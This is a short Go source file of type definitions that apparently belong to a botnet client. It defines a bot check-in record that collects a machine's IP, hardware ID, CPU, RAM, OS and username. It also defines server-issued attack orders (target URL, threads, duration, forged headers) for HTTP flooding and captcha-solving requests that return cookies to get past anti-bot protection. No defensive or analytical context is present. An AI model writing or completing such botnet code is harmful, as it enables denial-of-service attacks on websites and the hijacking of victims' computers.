package main

type KnockJSON struct {
	IP       string `json:"ip"`
	HWID     string `json:"hwid"`
	CPU      string `json:"cpu"`
	RAM      string `json:"ram"`
	OS       string `json:"os"`
	Username string `json:"username"`
}

type Response struct {
	Code    int      `json:"code"`
	Message string   `json:"message"`
	Tasks   []Task   `json:"tasks"`
	Attacks []Attack `json:"attacks"`
}

type Attack struct {
	AttackType     string `json:"attackType"`
	Method         string `json:"method"`
	TargetURL      string `json:"target"`
	Thread         int    `json:"thread"`
	Duration       int    `json:"duration"`
	Interval       int    `json:"interval"`
	Data           string `json:"data"`
	Accept         string `json:"accept"`
	AcceptEncoding string `json:"acceptEncoding"`
	AcceptLanguage string `json:"acceptLanguage"`
	UserAgent      string `json:"userAgent"`
	CustomHeader   string `json:"custom"`
}

type Task struct {
	TaskType  string `json:"taskType"`
	Parameter string `json:"parameter"`
}

type Cookie struct {
	Name  string `json:"name"`
	Value string `json:"value"`
}

type SolveJSON struct {
	Command   string `json:"cmd"`
	URL       string `json:"url"`
	UserAgent string `json:"userAgent"`
	SiteKey   string `json:"sitekey"`
	ApiKey    string `json:"apiKey"`
}

type SolveResponse struct {
	Code    int      `json:"code"`
	Message string   `json:"message"`
	Cookies []Cookie `json:"cookies"`
}
